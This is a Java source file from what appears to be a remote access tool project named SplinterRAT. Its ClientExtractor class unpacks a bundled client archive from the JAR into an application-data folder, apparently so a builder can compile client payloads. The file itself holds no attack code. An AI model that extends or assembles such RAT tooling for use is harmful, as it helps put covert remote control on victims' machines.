package Compiler;



import Server.ConnectionStore;

import net.lingala.zip4j.ZipFile;
import org.apache.commons.lang3.SystemUtils;


import javax.swing.*;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.concurrent.Callable;


public class ClientExtractor implements Callable<Boolean> {

    public static Path localClientFiles;

    @Override
    public Boolean call() {
        try {
            String folderDestination = "";
            if (SystemUtils.IS_OS_WINDOWS) {
                folderDestination = System.getenv("APPDATA");

            } else if (SystemUtils.IS_OS_LINUX) {
                folderDestination = System.getProperty("user.home");
            }
            return extractClientFilesFromJAR(folderDestination);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }


    public boolean extractClientFilesFromJAR(String folderDestination) throws IOException {
        InputStream stream;
        String finalFolderName = "/jcClient";
        String fileName = finalFolderName + ".zip";
        Path folderOfTempFiles = Path.of(folderDestination, "SplinterRAT", "Client Files");
        if (!Files.exists(folderOfTempFiles)) {
            Files.createDirectories(folderOfTempFiles);
        }
        Path fileLocation = Paths.get(folderOfTempFiles.toString(), fileName);
        try (OutputStream resStreamOut = new FileOutputStream(fileLocation.toFile());
             ZipFile zipFile = new ZipFile(fileLocation.toFile())) {
            stream = ClientExtractor.class.getResourceAsStream(fileName);
            int readBytes;
            byte[] buffer = new byte[4096];
            if (stream != null) {
                while ((readBytes = stream.read(buffer)) > 0) {
                    resStreamOut.write(buffer, 0, readBytes);
                }
            } else {
                return false;
            }
            zipFile.extractAll(folderOfTempFiles.toString());
            localClientFiles = Path.of(folderOfTempFiles.toString());
            System.out.println(localClientFiles);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return true;

    }


}